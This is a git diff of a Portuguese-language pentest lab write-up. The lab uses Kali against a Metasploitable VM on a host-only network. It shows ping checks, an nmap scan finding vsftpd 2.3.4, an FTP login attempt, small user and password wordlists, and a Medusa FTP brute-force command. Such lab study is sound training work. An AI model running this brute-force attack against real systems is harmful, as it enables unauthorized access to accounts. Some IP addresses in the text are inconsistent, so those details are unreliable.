@@ -7,13 +7,18 @@ Host Kali IP 192.168.56.102 - Placa de rede host only.
 Host Metaesploitable IP 192.16.56.101  - Placa de rede Host only.
 
 
-Verificar comunicação entre as maquinas .
+VERIFICANDO A COMUNICAÇÃO ENTRE OS HOSTS.
+
 
 Comando ping -c 3 192.16.56.101 sem perda de pacotes.
 
 Comando ping -c 3 192.16.56.102 sem perda de pacotes.
 
+
+
 RECONHECIMENTO DAS PORTAS DOS SERVIÇOS RELACIONADOS AO FTP.
+
+
 
 ~$ nmap -sV -p 21,22,80,445,139 192.168.56.101
 
@@ -26,7 +31,10 @@ Nmap scan report for 192.168.56.101
 Host is up (0.0012s latency).
 
 
+
 PORT STATE SERVICE VERSION
+
+
 
 21/tcp open ftp vsftpd 2.3.4
 
@@ -46,7 +54,11 @@ Service detection performed. Please report any incorrect results at https:// nma
 
 Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
 
+
+
 TESTE DE ACESSO AO FTP EXPOSTO
+
+
 
 1 └─$ ftp 192.168.56.101
 
@@ -56,13 +68,17 @@ TESTE DE ACESSO AO FTP EXPOSTO
 
 4 Name (192.168.56.101:kaliadmin): 
 
+
 CRIAÇÃO DO ARQUIVO DE SENHAS E PASSWORD
+
 
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 
+
 REALIZANDO TESTES DE BRUTE FORCE COM O MEDUSA
+
 
 $ medusa -H 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 
